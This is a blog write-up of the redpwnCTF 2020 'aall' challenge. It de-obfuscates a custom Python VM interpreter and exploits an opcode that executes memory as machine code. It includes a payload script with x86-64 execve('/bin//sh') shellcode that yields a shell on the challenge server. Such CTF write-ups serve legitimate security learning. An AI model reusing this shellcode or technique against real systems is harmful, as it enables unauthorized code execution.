<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="redpwnCTF - aall" property="og:title"><meta content="article" property="og:type"><meta content="2020-06-25" property="og:published_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="ctf-writeups" property="og:section"><meta content="redpwnctf20" property="og:tag"><meta content="reversing" property="og:tag"><meta content="python" property="og:tag"><meta content="/posts/redpwnctf20-aall/" property="og:url"><title>redpwnCTF - aall - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div></nav><section class="section"><div class="container"><div class="page-container"><div class="blog-header"><h1 class="title">redpwnCTF - aall</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2020-06-25">June 25, 2020 </span>in ctf-writeups</span></div><div class="tags"><a href="&#x2F;tags&#x2F;redpwnctf20&#x2F;"><span class="interactive minimal tag">redpwnctf20</span></a> <a href="&#x2F;tags&#x2F;reversing&#x2F;"><span class="interactive minimal tag">reversing</span></a> <a href="&#x2F;tags&#x2F;python&#x2F;"><span class="interactive minimal tag">python</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#decoding" data-target="decoding">Decoding</a><ul><li><a href="#breakout-aall" data-target="breakout-aall">breakout.aall</a></li></ul></li><li><a href="#payload-generation" data-target="payload-generation">Payload Generation</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>how many layers of vm are you on</p><p>like,, maybe 5, or 6 right now my dude</p><p>you are like a baby... watch this</p><p>nc 2020.redpwnc.tf 31755</p></blockquote><p>We're also given a <a href="https://gist.github.com/srikavin/f6fc3f9cf62155b95868bac16a40ba5a#file-aall-py">python file</a> and a <a href="https://gist.github.com/srikavin/f6fc3f9cf62155b95868bac16a40ba5a#file-dockerfile">Dockerfile</a>.</p><h1 id="decoding">Decoding</h1><p>Looking at the python file shows that it writes out a file named <code>breakout.aallo</code> and calls <code>exec</code> on a string after base64-decoding and lzma-uncompressing it. We can modify the file to save the executed file to disk instead. It's a <a href="https://gist.github.com/srikavin/0cba74ad88e43442154dd341979c9b6d">python script</a>, but all of the variables are random unicode characters. Although the python interpreter is happy to run the code, it's nearly impossible to understand.</p><span id="continue-reading"></span><p>I wrote a small script to replace all of the unicode characters with a different name:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">final </span><span style="font-weight:bold;color:#a71d5d;">= b</span><span style="color:#183691;">&#39;&#39;
</span><span style="color:#323232;">mapping </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">dict</span><span style="color:#323232;">()
counter </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0

</span><span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">c </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">decompressed:
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">c </span><span style="font-weight:bold;color:#a71d5d;">&gt;= </span><span style="color:#0086b3;">128</span><span style="color:#323232;">:
        </span><span style="font-weight:bold;color:#a71d5d;">if not </span><span style="color:#323232;">c </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">mapping:
            mapping[c] </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;v&#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">str</span><span style="color:#323232;">(counter)
            counter </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">1
        </span><span style="color:#323232;">final </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">mapping[c].encode()
    </span><span style="font-weight:bold;color:#a71d5d;">else</span><span style="color:#323232;">:
        final </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">bytes</span><span style="color:#323232;">([c])

</span><span style="color:#62a35c;">open</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;unpacked1.py&#39;</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;wb&#39;</span><span style="color:#323232;">).write(final)
</span></code></pre><p>This results in a <a href="https://gist.github.com/srikavin/d495f27076450822e0fc4f6cd4dbc62c">slightly easier to read file</a>:</p><p>I went ahead and renamed all of the variables and cleaned up the file. The <a href="https://gist.github.com/srikavin/cce2544f70b8283309ac088d274b3b06">resulting file</a> was clearly an interpreter. An interpreted program is passed through argv, which is then loaded into interpreter memory (an array). The first two bytes of the program contain the address to start interpreting at.</p><p>The interpreter isn't too complicated, but it has an interesting instruction <code>%</code>:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">elif </span><span style="color:#323232;">instr_type </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#183691;">&#39;%&#39;</span><span style="color:#323232;">:
    idd </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">id</span><span style="color:#323232;">(memory[registers[</span><span style="color:#183691;">&#39;ip&#39;</span><span style="color:#323232;">]:]) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">48
    </span><span style="color:#323232;">mmapped </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">mmap.mmap(</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">1</span><span style="color:#323232;">, mmap.</span><span style="color:#0086b3;">PAGESIZE</span><span style="color:#323232;">, prot</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;">mmap.</span><span style="color:#0086b3;">PROT_READ </span><span style="font-weight:bold;color:#a71d5d;">| </span><span style="color:#323232;">mmap.</span><span style="color:#0086b3;">PROT_WRITE </span><span style="font-weight:bold;color:#a71d5d;">| </span><span style="color:#323232;">mmap.</span><span style="color:#0086b3;">PROT_EXEC</span><span style="color:#323232;">)
    c_functype </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int)
    v3v17v25v21 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ctypes.c_void_p.from_buffer(mmapped)
    function </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">c_functype(ctypes.addressof(v3v17v25v21))
    v3v19v57v10 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">bytes</span><span style="color:#323232;">(memory[registers[</span><span style="color:#183691;">&#39;ip&#39;</span><span style="color:#323232;">]:]).replace(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\x00</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">, </span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;&#39;</span><span style="color:#323232;">)
    mmapped.write(v3v19v57v10)
    retVal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">function(idd)
    </span><span style="font-weight:bold;color:#a71d5d;">del </span><span style="color:#323232;">v3v17v25v21
    mmapped.close()
</span></code></pre><p>This instruction mmaps a new block of memory, loads the memory following the instruction pointer's current position, and executes it. This means if we somehow insert shellcode into memory, we can execute by using this opcode.</p><h2 id="breakout-aall">breakout.aall</h2><p>We also have the file <code>breakout.aall</code> which is the program interpreted by this interpreter. I wrote a script to print <a href="https://gist.github.com/srikavin/8c49d2d8c90d9f09aa6e6b5ed771c803">a disassembly</a> of this file. This program, when executed by the interpreter (which is executed by the python interpreter), loads the string <code>https://aaronesau.com/files/objectively-wrong.png</code> into memory, and then accepts user input.</p><p><code>breakout.aall</code> acts as an interpreter itself. It has five instructions:</p><ul><li><code>&gt;</code> which increments the stack pointer</li><li><code>&lt;</code> which decrements the stack pointer</li><li><code>+</code> which increments the value at the stack pointer (dereferences the stack pointer and increments the value)</li><li><code>-</code> which decrements the value at the stack pointer</li><li><code>?</code> which acts as a NOP</li></ul><p>We can use <code>breakout.aall</code> to write values to memory. Since, the opcodes for <code>breakout.aall</code> is also stored in memory, we can modify the executed opcodes to include a <code>%</code> instruction to execute shellcode.</p><p>The approach is clear: write shellcode to memory, then overwrite parts of <code>breakout.aal</code> in memory to jump to the shellcode.</p><h1 id="payload-generation">Payload Generation</h1><p>Conveniently, <code>breakout.aall</code> has a NOP instruction that we can overwrite to <code>%</code> to call shellcode. I wrote a script to generate the payload:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">sp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">1469


</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">move_sp_to</span><span style="color:#323232;">(goal):
    </span><span style="font-weight:bold;color:#a71d5d;">global </span><span style="color:#323232;">sp

    old_sp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">sp
    sp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">goal

    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">goal </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">old_sp:
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#183691;">&#39;&#39;
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">goal </span><span style="font-weight:bold;color:#a71d5d;">&gt; </span><span style="color:#323232;">old_sp:
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#183691;">&#39;&gt;&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(goal </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">old_sp)
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">goal </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#323232;">old_sp:
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#183691;">&#39;&lt;&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(old_sp </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">goal)


</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">write_val</span><span style="color:#323232;">(index, value, initial_value</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#0086b3;">0</span><span style="color:#323232;">):
    </span><span style="font-weight:bold;color:#a71d5d;">global </span><span style="color:#323232;">sp

    ret </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">move_sp_to(index)

    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">value </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">initial_value:
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">ret
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">value </span><span style="font-weight:bold;color:#a71d5d;">&gt; </span><span style="color:#323232;">initial_value:
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">ret </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&#39;+&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(value </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">initial_value)
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">value </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#323232;">initial_value:
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">ret </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&#39;-&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(initial_value </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">value)


payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;&quot;

</span><span style="color:#323232;">previous </span><span style="font-weight:bold;color:#a71d5d;">= b</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\x01\x00\x8a\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#183691;">https://aaronesau.com/files/ob&#39;
</span><span style="color:#323232;">shellcode </span><span style="font-weight:bold;color:#a71d5d;">= b</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><span style="color:#183691;">&#39;
</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(shellcode)
</span><span style="font-style:italic;color:#969896;"># % INSTR AT 1398
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">write_val(</span><span style="color:#0086b3;">1398</span><span style="color:#323232;">, </span><span style="color:#0086b3;">0x25</span><span style="color:#323232;">, </span><span style="color:#0086b3;">0x5</span><span style="color:#323232;">)

</span><span style="font-style:italic;color:#969896;"># write payload
</span><span style="color:#323232;">i </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0
</span><span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">b </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">shellcode:
    payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">write_val(</span><span style="color:#0086b3;">1400 </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">i, b, previous[i])
    i </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">1

</span><span style="font-style:italic;color:#969896;"># trigger shellcode
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&quot;?&quot;

</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(payload)
</span></code></pre><p>Since we can only increment and decrement the values at certain locations, I included the values at the memory location before running the script, so that those addresses could be incremented/decremented appropriately.</p><p>Piping the output from this script into the program gives us a shell, and we can get the flag: <code>flag{b1ng0!_obl1g4t0ry-sh1tty-cust0m_4rch_ch4l-ftw}</code>.</p></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="💬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>